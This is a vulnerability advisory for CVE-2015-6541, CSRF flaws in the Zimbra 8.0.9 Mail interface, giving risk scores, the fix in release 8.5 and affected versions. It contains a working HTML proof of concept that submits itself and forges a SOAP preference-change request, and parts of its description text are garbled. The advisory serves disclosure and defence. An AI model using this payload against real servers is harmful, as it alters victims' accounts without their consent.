24937.txt

Multiple CSRF in Zimbra Mail interface
======================================
 
 
CVE-2015-6541
 
Description
===========
 
Multiple CSRF vulnerabilities have been found in the Mail interface of
Zimbra 8.0.9 GA Release, enabling to change account
 
 
CSRF
====
 
to CSRF because of the lack of a CSRF token identifying a valid session.
As a consequence, requests can be forged and played arbitrarily.
 
**Access Vector**: remote
**Security Risk**: low
**Vulnerability**: CWE-352
**CVSS Base score**: 5.8
 
----------------
Proof of Concept
----------------
 
<html>
<body>
<form enctype="text/plain" id="trololo"
action="https://192.168.0.171/service/soap/BatchRequest" method="POST">
    <input name=&#039;<soap:Envelope
xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context
xmlns="urn:zimbra"><userAgent xmlns="" name="ZimbraWebClient - FF38
(Win)" version="8.0.9_GA_6191"/><session xmlns="" id="19"/><account
xmlns="" by="name">anto@mail.ubuntu.fr</account><format xmlns=""
type="js"/></context></soap:Header><soap:Body><BatchRequest
xmlns="urn:zimbra" onerror="stop"><ModifyPrefsRequest
xmlns="" n&#039;
value=&#039;"sn">itworks</a></BatchRequest></soap:Body></soap:Envelope>&#039;/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
 
 
Solution
========
 
Sensitive forms should be protected by a CSRF token.
 
 
Fixes
=====
 
Fixed with 8.5 release : bug 83547
(https://wiki.zimbra.com/wiki/Security/Collab/86#Notes_from_8.5)
 
 
Affected versions
=================
 
 * Zimbra <= 8.0.9 GA Release

